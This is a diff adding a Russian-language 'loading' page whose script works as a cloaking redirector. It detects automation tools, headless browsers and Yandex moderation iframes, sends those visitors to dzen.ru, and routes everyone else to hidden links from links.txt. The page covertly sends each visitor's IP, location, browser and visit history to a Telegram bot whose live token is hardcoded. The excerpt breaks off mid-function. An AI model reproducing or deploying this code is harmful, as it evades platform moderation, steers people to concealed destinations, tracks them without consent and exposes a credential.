@@ -1,0 +1,1225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .mouse-prompt {
+            margin-top: 30px;
+            opacity: 1;
+            transition: opacity 0.5s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .mouse-icon {
+            width: 30px;
+            height: 50px;
+            border: 2px solid #333;
+            border-radius: 15px;
+            position: relative;
+            margin-bottom: 10px;
+        }
+        
+        .mouse-icon:before {
+            content: '';
+            width: 6px;
+            height: 10px;
+            background-color: #333;
+            border-radius: 3px;
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: scroll 1.5s infinite;
+        }
+        
+        @keyframes scroll {
+            0% { transform: translateX(-50%) translateY(0); opacity: 1; }
+            100% { transform: translateX(-50%) translateY(15px); opacity: 0; }
+        }
+        
+        .hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .mobile-only {
+            display: none;
+        }
+        
+        @media (max-width: 768px) {
+            .desktop-only {
+                display: none;
+            }
+            
+            .mobile-only {
+                display: block;
+            }
+        }
+
+        .manual-redirect {
+            display: none;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .manual-redirect.visible {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .redirect-button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 15px;
+        }
+
+        .redirect-button:hover {
+            background-color: #2980b9;
+        }
+
+        .redirect-button:active {
+            background-color: #1f6da8;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <h2>Загрузка...</h2>
+        <div class="loader"></div>
+        <div class="mouse-prompt desktop-only" id="mousePrompt">
+            <div class="mouse-icon"></div>
+            <p>Пожалуйста, пошевелите мышью для продолжения</p>
+        </div>
+        <p class="mobile-only">Пожалуйста, подождите...</p>
+        <div class="manual-redirect" id="manualRedirect">
+            <p>Автоматический переход не сработал.</p>
+            <p>Пожалуйста, нажмите кнопку ниже для продолжения:</p>
+            <button class="redirect-button" id="redirectButton">Продолжить</button>
+        </div>
+    </div>
+
+    <script>
+    // ==================== КОНФИГУРАЦИЯ ====================
+    const CONFIG = {
+        // Основные настройки
+        baseRedirectDelay: 500, // базовая задержка редиректа в мс (минимальная)
+        mouseMovementTimeout: 5000, // время ожидания движения мыши в мс
+        botRedirectUrl: 'https://dzen.ru', // URL для редиректа ботов
+        
+        // Пути к файлам
+        blockedIPsUrl: 'BlockIP.txt',
+        blockedUAsUrl: 'BlockUAs.txt',
+        linksUrl: 'links.txt',
+        
+        // Настройки проверок
+        checks: {
+            mouseMovement: true,        // Проверка движения мыши
+            headlessBrowser: false,      // Проверка headless браузера
+            webdriver: true,            // Проверка webdriver
+            iframeYang: true,           // Проверка iframe-yang.yandex
+            blockedIPs: true,           // Проверка заблокированных IP
+            blockedUAs: true,           // Проверка заблокированных UA
+            screenParameters: false     // Проверка параметров экрана (отключена, т.к. не является приоритетной)
+        },
+        
+        // Telegram API
+        telegram: {
+            token: '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU',
+            chatId: '1237450939',
+            retryAttempts: 2,           // Количество попыток отправки
+            retryDelay: 500             // Задержка между попытками в мс
+        },
+        
+        // Таймауты и повторные попытки для критических операций
+        network: {
+            // Таймауты для запросов (мс)
+            timeouts: {
+                ip: 1500,
+                location: 1500,
+                links: 2000,
+                blockedResources: 1000,
+                redirect: 2000,
+                manualRedirectShow: 10000 // время до показа кнопки ручного редиректа
+            },
+            
+            // Повторные попытки для критических операций
+            retries: {
+                ip: 2,
+                location: 2,
+                links: 3,
+                blockedResources: 1,
+                redirect: 2
+            },
+            
+            // Задержка между повторными попытками (мс)
+            retryDelays: {
+                ip: 300,
+                location: 300,
+                links: 500,
+                blockedResources: 200,
+                redirect: 1000
+            }
+        },
+
+        // Настройки для отслеживания посещений
+        visitsTracking: {
+            storageKey: 'userVisits', // ключ для localStorage
+            maxStoredVisits: 10       // максимальное количество хранимых визитов
+        }
+    };
+
+    // ==================== УТИЛИТЫ ====================
+    
+    // Утилиты для работы с Promise и таймаутами
+    const promiseUtils = {
+        // Promise с таймаутом
+        withTimeout: (promise, timeoutMs, fallbackValue = null) => {
+            let timeoutHandle;
+            const timeoutPromise = new Promise(resolve => {
+                timeoutHandle = setTimeout(() => resolve(fallbackValue), timeoutMs);
+            });
+            
+            return Promise.race([
+                promise.then(value => {
+                    clearTimeout(timeoutHandle);
+                    return value;
+                }).catch(error => {
+                    clearTimeout(timeoutHandle);
+                    console.error('Promise error:', error);
+                    return fallbackValue;
+                }),
+                timeoutPromise
+            ]);
+        },
+        
+        // Promise с повторными попытками
+        withRetry: async (fn, retries, delay, ...args) => {
+            try {
+                return await fn(...args);
+            } catch (error) {
+                if (retries <= 0) throw error;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                return promiseUtils.withRetry(fn, retries - 1, delay * 1.5, ...args);
+            }
+        }
+    };
+    
+    // Утилиты для определения устройства
+    const deviceInfo = {
+        isMobile: () => {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        },
+        isIOS: () => {
+            return /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        },
+        isZenApp: () => {
+            return navigator.userAgent.includes('ru.zen.android');
+        },
+        getBrowserInfo: () => {
+            const ua = navigator.userAgent;
+            let browserName = "Unknown";
+            let browserVersion = "";
+            
+            if (ua.indexOf("Firefox") > -1) {
+                browserName = "Firefox";
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "";
+            } else if (ua.indexOf("SamsungBrowser") > -1) {
+                browserName = "Samsung Browser";
+                browserVersion = ua.match(/SamsungBrowser\/([0-9.]+)/)?.[1] || "";
+            } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
+                browserName = "Opera";
+                browserVersion = ua.indexOf("Opera") > -1 ? 
+                    (ua.match(/Opera\/([0-9.]+)/)?.[1] || "") : 
+                    (ua.match(/OPR\/([0-9.]+)/)?.[1] || "");
+            } else if (ua.indexOf("Edg") > -1) {
+                browserName = "Edge";
+                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || "";
+            } else if (ua.indexOf("Chrome") > -1) {
+                browserName = "Chrome";
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "";
+            } else if (ua.indexOf("Safari") > -1) {
+                browserName = "Safari";
+                browserVersion = ua.match(/Safari\/([0-9.]+)/)?.[1] || "";
+            } else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) {
+                browserName = "Internet Explorer";
+                browserVersion = ua.indexOf("MSIE") > -1 ? 
+                    (ua.match(/MSIE ([0-9.]+)/)?.[1] || "") : 
+                    (ua.match(/rv:([0-9.]+)/)?.[1] || "");
+            }
+            
+            return `${browserName} ${browserVersion}`;
+        },
+        getOS: () => {
+            const ua = navigator.userAgent;
+            let os = "Unknown";
+            
+            if (ua.indexOf("Win") > -1) os = "Windows";
+            else if (ua.indexOf("Mac") > -1) os = "MacOS";
+            else if (ua.indexOf("X11") > -1) os = "UNIX";
+            else if (ua.indexOf("Linux") > -1) os = "Linux";
+            else if (ua.indexOf("Android") > -1) os = "Android";
+            else if (ua.indexOf("iOS") > -1 || /iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+            
+            return os;
+        },
+        getNetworkInfo: () => {
+            if (!navigator.connection) return "Unknown";
+            
+            const conn = navigator.connection;
+            return {
+                type: conn.effectiveType || "Unknown",
+                rtt: conn.rtt || 0,
+                downlink: conn.downlink || 0,
+                saveData: conn.saveData || false
+            };
+        }
+    };
+
+    // Утилиты для работы с сетью
+    const networkUtils = {
+        // Получение IP пользователя с несколькими резервными API
+        getIP: async () => {
+            const ipApis = [
+                { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
+                { url: 'https://api.db-ip.com/v2/free/self', parser: (data) => data.ipAddress },
+                { url: 'https://api.myip.com', parser: (data) => data.ip },
+                { url: 'https://ipinfo.io/json', parser: (data) => data.ip }
+            ];
+            
+            for (const api of ipApis) {
+                try {
+                    const response = await promiseUtils.withTimeout(
+                        fetch(api.url), 
+                        CONFIG.network.timeouts.ip
+                    );
+                    
+                    if (!response || !response.ok) continue;
+                    
+                    const data = await response.json();
+                    const ip = api.parser(data);
+                    
+                    if (ip) return { ip, error: null };
+                } catch (error) {
+                    console.error(`Error fetching IP from ${api.url}:`, error);
+                    // Продолжаем со следующим API
+                }
+            }
+            
+            return { ip: "unknown", error: "All IP APIs failed" };
+        },
+        
+        // Получение геолокации по IP с несколькими резервными API
+        getLocationByIP: async (ip) => {
+            if (ip === "unknown") return { country: "unknown", city: "unknown", error: "No IP provided" };
+            
+            const locationApis = [
+                { 
+                    url: `https://ipapi.co/${ip}/json/`, 
+                    parser: (data) => ({ 
+                        country: data.country_name || "unknown", 
+                        city: data.city || "unknown" 
+                    })
+                },
+                { 
+                    url: `https://ip-api.com/json/${ip}`, 
+                    parser: (data) => ({ 
+                        country: data.country || "unknown", 
+                        city: data.city || "unknown" 
+                    })
+                },
+                { 
+                    url: `https://ipinfo.io/${ip}/json`, 
+                    parser: (data) => ({ 
+                        country: data.country || "unknown", 
+                        city: data.city || "unknown" 
+                    })
+                }
+            ];
+            
+            for (const api of locationApis) {
+                try {
+                    const response = await promiseUtils.withTimeout(
+                        fetch(api.url), 
+                        CONFIG.network.timeouts.location
+                    );
+                    
+                    if (!response || !response.ok) continue;
+                    
+                    const data = await response.json();
+                    return { ...api.parser(data), error: null };
+                } catch (error) {
+                    console.error(`Error fetching location from ${api.url}:`, error);
+                    // Продолжаем со следующим API
+                }
+            }
+            
+            return { country: "unknown", city: "unknown", error: "All location APIs failed" };
+        },
+        
+        // Загрузка файла с блокируемыми IP с повторными попытками
+        loadBlockedIPs: async () => {
+            try {
+                const response = await promiseUtils.withTimeout(
+                    fetch(CONFIG.blockedIPsUrl),
+                    CONFIG.network.timeouts.blockedResources
+                );
+                
+                if (!response || !response.ok) return [];
+                
+                const text = await response.text();
+                return text.split('\n')
+                    .map(line => line.trim())
+                    .filter(ip => ip !== '');
+            } catch (error) {
+                console.error("Error loading blocked IPs:", error);
+                return [];
+            }
+        },
+        
+        // Загрузка файла с блокируемыми UA с повторными попытками
+        loadBlockedUAs: async () => {
+            try {
+                const response = await promiseUtils.withTimeout(
+                    fetch(CONFIG.blockedUAsUrl),
+                    CONFIG.network.timeouts.blockedResources
+                );
+                
+                if (!response || !response.ok) return [];
+                
+                const text = await response.text();
+                return text.split('\n')
+                    .map(line => line.trim())
+                    .filter(ua => ua !== '');
+            } catch (error) {
+                console.error("Error loading blocked UAs:", error);
+                return [];
+            }
+        },
+        
+        // Загрузка файла с целевыми ссылками с повторными попытками
+        loadLinks: async () => {
+            const loadLinksAttempt = async () => {
+                const response = await fetch(CONFIG.linksUrl);
+                if (!response.ok) {
+                    throw new Error(`Failed to load links: ${response.status}`);
+                }
+                const text = await response.text();
+                return text.split('\n')
+                    .map(line => line.trim())
+                    .filter(link => link !== '');
+            };
+            
+            try {
+                return await promiseUtils.withRetry(
+                    loadLinksAttempt,
+                    CONFIG.network.retries.links,
+                    CONFIG.network.retryDelays.links
+                );
+            } catch (error) {
+                console.error("Error loading links after retries:", error);
+                return [];
+            }
+        },
+        
+        // Отправка сообщения в Telegram с повторными попытками
+        sendToTelegram: async (message, attempt = 1) => {
+            if (attempt > CONFIG.telegram.retryAttempts) {
+                console.error("Failed to send message to Telegram after multiple attempts");
+                return false;
+            }
+            
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegram.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (!data.ok) {
+                    console.error("Telegram API error:", data);
+                    await new Promise(r => setTimeout(r, CONFIG.telegram.retryDelay));
+                    return networkUtils.sendToTelegram(message, attempt + 1);
+                }
+                
+                return true;
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+                await new Promise(r => setTimeout(r, CONFIG.telegram.retryDelay));
+                return networkUtils.sendToTelegram(message, attempt + 1);
+            }
+        }
+    };
+
+    // Утилиты для работы с посещениями пользователя
+    const visitsUtils = {
+        // Проверка, является ли текущее посещение первым
+        isFirstVisit: () => {
+            try {
+                return localStorage.getItem(CONFIG.visitsTracking.storageKey) === null;
+            } catch (error) {
+                console.error("Error checking first visit:", error);
+                return true; // Если ошибка доступа к localStorage, считаем что первый визит
+            }
+        },
+        
+        // Получение истории посещений из localStorage
+        getVisitHistory: () => {
+            try {
+                const storedData = localStorage.getItem(CONFIG.visitsTracking.storageKey);
+                return storedData ? JSON.parse(storedData) : [];
+            } catch (error) {
+                console.error("Error reading visit history:", error);
+                return [];
+            }
+        },
+        
+        // Сохранение информации о текущем посещении
+        saveCurrentVisit: () => {
+            try {
+                const visits = visitsUtils.getVisitHistory();
+                const currentTime = Date.now();
+                
+                // Добавляем текущее посещение
+                visits.push({
+                    timestamp: currentTime,
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer || "direct"
+                });
+                
+                // Ограничиваем количество сохраненных посещений
+                while (visits.length > CONFIG.visitsTracking.maxStoredVisits) {
+                    visits.shift();
+                }
+                
+                localStorage.setItem(CONFIG.visitsTracking.storageKey, JSON.stringify(visits));
+                return visits;
+            } catch (error) {
+                console.error("Error saving visit:", error);
+                return [];
+            }
+        },
+        
+        // Получение информации о посещениях для отчета
+        getVisitsInfo: () => {
+            const isFirst = visitsUtils.isFirstVisit();
+            
+            // Сохраняем текущее посещение
+            const visits = visitsUtils.saveCurrentVisit();
+            
+            if (isFirst || visits.length <= 1) {
+                return {
+                    isFirstVisit: true,
+                    totalVisits: 1, // Только текущее посещение
+                    lastVisitTime: null,
+                    timeSinceLastVisit: null
+                };
+            }
+            
+            const currentTime = Date.now();
+            // Берем предпоследний визит (последний - это текущий, который мы только что добавили)
+            const lastVisit = visits.length >= 2 ? visits[visits.length - 2] : null;
+            
+            if (!lastVisit) {
+                return {
+                    isFirstVisit: true,
+                    totalVisits: 1,
+                    lastVisitTime: null,
+                    timeSinceLastVisit: null
+                };
+            }
+            
+            const timeSinceLastVisit = currentTime - lastVisit.timestamp;
+            
+            return {
+                isFirstVisit: false,
+                totalVisits: visits.length, // Включая текущее посещение
+                lastVisitTime: new Date(lastVisit.timestamp).toISOString(),
+                timeSinceLastVisit: Math.floor(timeSinceLastVisit / 1000) // в секундах
+            };
+        }
+    };
+
+    // Утилиты для редиректа с проверкой успешности
+    const redirectUtils = {
+        // Методы редиректа в порядке предпочтения (от наиболее кросс-браузерного к менее)
+        methods: [
+            // Метод 1: location.href - самый совместимый метод
+            (url) => { window.location.href = url; return true; },
+            
+            // Метод 2: location.replace - предотвращает добавление в историю
+            (url) => { window.location.replace(url); return true; },
+            
+            // Метод 3: document.location
+            (url) => { document.location = url; return true; },
+            
+            // Метод 4: meta refresh
+            (url) => { 
+                const meta = document.createElement('meta');
+                meta.httpEquiv = 'refresh';
+                meta.content = `0;url=${url}`;
+                document.head.appendChild(meta);
+                return true;
+            },
+            
+            // Метод 5: window.open
+            (url) => { window.open(url, '_self'); return true; }
+        ],
+        
+        // Показать кнопку для ручного редиректа
+        showManualRedirectButton: (url) => {
+            const manualRedirect = document.getElementById('manualRedirect');
+            const redirectButton = document.getElementById('redirectButton');
+            
+            if (manualRedirect && redirectButton) {
+                manualRedirect.classList.add('visible');
+                redirectButton.onclick = () => {
+                    window.location.href = url;
+                };
+            }
+        },
+        
+        // Выполнение редиректа с повторными попытками и проверкой успешности
+        redirect: async (url, delay = 0) => {
+            if (delay > 0) {
+                await new Promise(resolve => setTimeout(resolve, delay));
+            }
+            
+            // Показываем кнопку ручного редиректа после таймаута
+            setTimeout(() => {
+                redirectUtils.showManualRedirectButton(url);
+            }, CONFIG.network.timeouts.manualRedirectShow);
+            
+            let successfulMethod = null;
+            let redirectAttempt = 0;
+            const maxAttempts = CONFIG.network.retries.redirect + 1; // +1 для первой попытки
+            
+            while (redirectAttempt < maxAttempts) {
+                // Попробуем все методы по очереди
+                for (const method of redirectUtils.methods) {
+                    try {
+                        const result = method(url);
+                        if (result) {
+                            successfulMethod = method.toString();
+                            
+                            // Проверяем успешность редиректа через setTimeout
+                            return new Promise((resolve) => {
+                                const checkRedirectTimeout = setTimeout(() => {
+                                    // Если мы все еще здесь, значит редирект не сработал
+                                    resolve({ 
+                                        success: false, 
+                                        method: successfulMethod,
+                                        attempts: redirectAttempt + 1
+                                    });
+                                }, CONFIG.network.timeouts.redirect);
+                                
+                                // Это нужно для предотвращения утечки памяти
+                                window.addEventListener('beforeunload', () => {
+                                    clearTimeout(checkRedirectTimeout);
+                                    resolve({ 
+                                        success: true, 
+                                        method: successfulMethod,
+                                        attempts: redirectAttempt + 1
+                                    });
+                                }, { once: true });
+                            });
+                        }
+                    } catch (error) {
+                        console.error(`Redirect method failed (attempt ${redirectAttempt+1}):`, error);
+                        // Продолжаем со следующим методом
+                    }
+                }
+                
+                // Если все методы не сработали, увеличиваем счетчик попыток и ждем перед следующей попыткой
+                redirectAttempt++;
+                if (redirectAttempt < maxAttempts) {
+                    await new Promise(resolve => 
+                        setTimeout(resolve, CONFIG.network.retryDelays.redirect * redirectAttempt)
+                    );
+                }
+            }
+            
+            // Если все попытки не удались, возвращаем неудачу
+            return { 
+                success: false, 
+                method: "All methods failed", 
+                attempts: redirectAttempt
+            };
+        }
+    };
+
+    // ==================== ДЕТЕКТОРЫ БОТОВ ====================
+    
+    const botDetector = {
+        // Проверка headless браузера
+        checkHeadlessBrowser: () => {
+            // Набор признаков headless браузера
+            const signals = [];
+            
+            // Проверка наличия navigator
+            if (!navigator) {
+                signals.push("No navigator");
+                return { isBot: true, reason: "No navigator object" };
+            }
+            
+            // Проверка plugins (в headless обычно пусто или подделано)
+            if (navigator.plugins) {
+                if (navigator.plugins.length === 0) {
+                    signals.push("No plugins");
+                }
+                
+                // В headless часто используются фиктивные плагины с пустыми свойствами
+                if (navigator.plugins.length > 0) {
+                    let hasEmptyPlugin = false;
+                    for (let i = 0; i < navigator.plugins.length; i++) {
+                        const plugin = navigator.plugins[i];
+                        if (!plugin.name && !plugin.filename) {
+                            hasEmptyPlugin = true;
+                            break;
+                        }
+                    }
+                    if (hasEmptyPlugin) {
+                        signals.push("Empty plugin detected");
+                    }
+                }
+            }
+            
+            // Проверка languages (в headless часто пусто)
+            if (navigator.languages && navigator.languages.length === 0) {
+                signals.push("No languages");
+            }
+            
+            // Проверка inconsistent userAgent
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('headless')) {
+                signals.push("Headless in UA");
+            }
+            
+            // Проверка несоответствий в User-Agent
+            if (userAgent.includes('chrome') && !window.chrome) {
+                signals.push("Chrome in UA but no chrome object");
+            }
+            
+            // Проверка webdriver
+            if (navigator.webdriver) {
+                signals.push("webdriver=true");
+            }
+            
+            // Проверка отсутствия/аномалий в свойствах для тач-устройств
+            if (userAgent.includes('mobile') || userAgent.includes('android') || userAgent.includes('iphone')) {
+                // Для мобильных устройств должны быть определены touch-события
+                if (!('ontouchstart' in window)) {
+                    signals.push("Mobile UA but no touch events");
+                }
+            }
+            
+            // Проверка аномалий в размерах окна/экрана
+            if (window.outerWidth === 0 || window.outerHeight === 0) {
+                signals.push("Zero window dimensions");
+            }
+            
+            // Проверка на аномалии в разрешении экрана
+            if (window.screen && (window.screen.width === 0 || window.screen.height === 0)) {
+                signals.push("Zero screen dimensions");
+            }
+            
+            // Проверка на наличие Notification API (обычно отсутствует в headless)
+            if (!('Notification' in window)) {
+                signals.push("No Notification API");
+            }
+            
+            // Проверка на аномалии в отпечатке Canvas
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Hello, world!", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Hello, world!", 4, 17);
+                
+                const dataURL = canvas.toDataURL();
+                if (dataURL === "data:,") {
+                    signals.push("Empty canvas fingerprint");
+                }
+            } catch (e) {
+                signals.push("Canvas error");
+            }
+            
+            // Не считаем iOS устройства ботами, даже если есть некоторые сигналы
+            if (deviceInfo.isIOS() && signals.length < 3) {
+                return { isBot: false, reason: "iOS device with acceptable signals" };
+            }
+            
+            // Если набралось достаточно признаков, считаем браузер headless
+            const isBot = signals.length >= 2;
+            return {
+                isBot,
+                reason: isBot ? `Headless browser detected: ${signals.join(", ")}` : "Not a headless browser"
+            };
+        },
+        
+        // Проверка webdriver
+        checkWebdriver: () => {
+            const signals = [];
+            
+            // Прямая проверка свойства webdriver
+            if (navigator.webdriver === true) {
+                signals.push("navigator.webdriver=true");
+            }
+            
+            // Проверка на Selenium
+            if (typeof document.$cdc_asdjflasutopfhvcZLmcfl_ !== 'undefined' ||
+                typeof document.$wdc_async_resume_ !== 'undefined' ||
+                typeof document.$chrome_asyncScriptInfo !== 'undefined') {
+                signals.push("Selenium detected");
+            }
+            
+            // Проверка на PhantomJS
+            if (window._phantom || window.callPhantom) {
+                signals.push("PhantomJS detected");
+            }
+            
+            // Проверка на Nightmare.js
+            if (window.__nightmare) {
+                signals.push("Nightmare.js detected");
+            }
+            
+            // Проверка на Puppeteer
+            if (navigator.userAgent.includes('HeadlessChrome')) {
+                signals.push("Puppeteer detected");
+            }
+            
+            // Не считаем iOS устройства ботами, даже если есть некоторые сигналы
+            if (deviceInfo.isIOS() && signals.length < 2) {
+                return { isBot: false, reason: "iOS device with acceptable signals" };
+            }
+            
+            const isBot = signals.length > 0;
+            return {
+                isBot,
+                reason: isBot ? `Webdriver detected: ${signals.join(", ")}` : "No webdriver detected"
+            };
+        },
+        
+        // Проверка iframe-yang.yandex
+        checkIframeYang: () => {
+            if (window.location !== window.parent.location) {
+                try {
+                    if (window.parent.location.href.includes('iframe-yang.yandex')) {
+                        return { isBot: true, reason: "iframe-yang.yandex detected" };
+                    }
+                } catch (e) {
+                    // Ошибка доступа к родительскому фрейму из-за Same-Origin Policy
+                    // Это нормально и не является признаком бота
+                }
+            }
+            return { isBot: false, reason: "Not in iframe-yang" };
+        },
+        
+        // Проверка IP против списка заблокированных
+        checkBlockedIP: (ip, blockedIPs) => {
+            if (!ip || ip === "unknown" || !blockedIPs || blockedIPs.length === 0) {
+                return { isBot: false, reason: "IP check skipped" };
+            }
+            
+            const isBlocked = blockedIPs.includes(ip);
+            return {
+                isBot: isBlocked,
+                reason: isBlocked ? `IP ${ip} is in block list` : `IP ${ip} is not blocked`
+            };
+        },
+        
+        // Проверка User-Agent против списка заблокированных фрагментов
+        checkBlockedUA: (userAgent, blockedUAs) => {
+            if (!userAgent || !blockedUAs || blockedUAs.length === 0) {
+                return { isBot: false, reason: "UA check skipped" };
+            }
+            
+            const ua = userAgent.toLowerCase();
+            for (const blockedUA of blockedUAs) {
+                if (blockedUA && blockedUA.trim() !== '' && ua.includes(blockedUA.toLowerCase())) {
+                    return { isBot: true, reason: `UA contains blocked fragment: ${blockedUA}` };
+                }
+            }
+            
+            return { isBot: false, reason: "UA is not blocked" };
+        }
+    };
+
+    // ==================== ОСНОВНАЯ ЛОГИКА ====================
+    
+    // Состояние приложения
+    const state = {
+        mouseMovementDetected: false,
+        botDetectionResults: [],
+        targetUrl: null,
+        isBot: false,
+        botReason: "",
+        ipInfo: { ip: "unknown", error: null },
+        locationInfo: { country: "unknown", city: "unknown", error: null },
+        visitsInfo: null,
+        redirectMethod: "",
+        redirectSuccess: false,
+        redirectAttempts: 0,
+        startTime: Date.now(),
+        processingTime: 0
+    };
+
+    // Получение целевого URL
+    const getTargetUrl = async () => {
+        // Получаем код из URL параметров
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        
+        if (!code) {
+            // Если код не указан, используем реферер или дефолтный URL
+            return document.referrer || CONFIG.botRedirectUrl;
+        }
+        
+        // Загружаем список ссылок
+        const links = await networkUtils.loadLinks();
+        
+        if (!links || links.length === 0) {
+            // Если не удалось загрузить ссылки, используем реферер или дефолтный URL
+            return document.referrer || CONFIG.botRedirectUrl;
+        }
+        
+        const lineNumber = parseInt(code, 10);
+        if (isNaN(lineNumber) || lineNumber < 1 || lineNumber > links.length) {
+            // Если номер строки некорректный, используем реферер или дефолтный URL
+            return document.referrer || CONFIG.botRedirectUrl;
+        }
+        
+        // Возвращаем ссылку из соответствующей строки (с учетом индексации с 0)
+        return links[lineNumber - 1];
+    };
+
+    // Обработчик движения мыши
+    const handleMouseMovement = () => {
+        state.mouseMovementDetected = true;
+        const mousePrompt = document.getElementById('mousePrompt');
+        if (mousePrompt) {
+            mousePrompt.classList.add('hidden');
+        }
+    };
+
+    // Формирование отчета для Telegram
+    const prepareReport = (isRedirectFailure = false) => {
+        const emoji = state.isBot ? "🤖 БОТ" : "👤 ЧЕЛОВЕК";
+        const failureEmoji = isRedirectFailure ? "❌ ОШИБКА РЕДИРЕКТА" : "";
+        const screenInfo = `${window.screen.width}x${window.screen.height}`;
+        const windowInfo = `${window.innerWidth}x${window.innerHeight}`;
+        const language = navigator.language || "unknown";
+        const isMobile = deviceInfo.isMobile() ? "Да" : "Нет";
+        const browser = deviceInfo.getBrowserInfo();
+        const os = deviceInfo.getOS();
+        const networkInfo = deviceInfo.getNetworkInfo();
+        const networkType = typeof networkInfo === 'string' ? networkInfo : networkInfo.type;
+        
+        // Информация о посещениях
+        const visitsInfo = state.visitsInfo;
+        let visitsText = "Н/Д";
+        
+        if (visitsInfo) {
+            if (visitsInfo.isFirstVisit) {
+                visitsText = "Первое посещение";
+            } else {
+                const timeSinceLastVisitFormatted = visitsInfo.timeSinceLastVisit < 60 
+                    ? `${visitsInfo.timeSinceLastVisit} сек.` 
+                    : visitsInfo.timeSinceLastVisit < 3600 
+                        ? `${Math.floor(visitsInfo.timeSinceLastVisit / 60)} мин.`
+                        : visitsInfo.timeSinceLastVisit < 86400
+                            ? `${Math.floor(visitsInfo.timeSinceLastVisit / 3600)} час.`
+                            : `${Math.floor(visitsInfo.timeSinceLastVisit / 86400)} дн.`;
+                
+                visitsText = `${visitsInfo.totalVisits} посещений, последнее ${timeSinceLastVisitFormatted} назад`;
+            }
+        }
+        
+        return `
+<b>${emoji} ${failureEmoji}</b>
+
+<b>IP:</b> ${state.ipInfo.ip}
+<b>Местоположение:</b> ${state.locationInfo.city}, ${state.locationInfo.country}
+<b>User-Agent:</b> ${navigator.userAgent}
+<b>Браузер:</b> ${browser}
+<b>ОС:</b> ${os}
+<b>Разрешение экрана:</b> ${screenInfo}
+<b>Размер окна:</b> ${windowInfo}
+<b>Язык:</b> ${language}
+<b>Мобильное устройство:</b> ${isMobile}
+<b>Тип сети:</b> ${networkType}
+<b>Посещения:</b> ${visitsText}
+<b>Метод редиректа:</b> ${state.redirectMethod}
+<b>Успех редиректа:</b> ${state.redirectSuccess ? "Да" : "Нет"}
+<b>Попыток редиректа:</b> ${state.redirectAttempts}
+<b>Редирект на:</b> ${state.targetUrl}
+<b>Реферер:</b> ${document.referrer || "Нет"}
+<b>Время обработки:</b> ${state.processingTime}ms
+
+<b>Причина (если бот):</b> ${state.botReason || "Н/Д"}
+`;
+    };
+
+    // Функция быстрого редиректа для приложения Дзен
+    const fastRedirectForZen = async () => {
+        // Получаем целевой URL
+        state.targetUrl = await getTargetUrl();
+        
+        // Получаем информацию о посещениях
+        state.visitsInfo = visitsUtils.getVisitsInfo();
+        
+        // Выполняем редирект
+        const redirectResult = await redirectUtils.redirect(state.targetUrl, CONFIG.baseRedirectDelay);
+        state.redirectMethod = redirectResult.method;
+        state.redirectSuccess = redirectResult.success;
+        state.redirectAttempts = redirectResult.attempts || 1;
+        
+        // Если редирект не удался, отправляем отчет
+        if (!redirectResult.success) {
+            try {
+                state.ipInfo = await networkUtils.getIP();
+                state.locationInfo = await networkUtils.getLocationByIP(state.ipInfo.ip);
+                state.processingTime = Date.now() - state.startTime;
+                
+                const report = prepareReport(true);
+                await networkUtils.sendToTelegram(report);
+            } catch (error) {
+                console.error("Failed to send failure report:", error);
+            }
+        }
+    };
+
+    // Основная функция проверки и редиректа
+    const checkAndRedirect = async () => {
+        try {
+            // Если это приложение Дзен, быстро редиректим без проверок
+            if (deviceInfo.isZenApp()) {
+                await fastRedirectForZen();
+                return;
+            }
+            
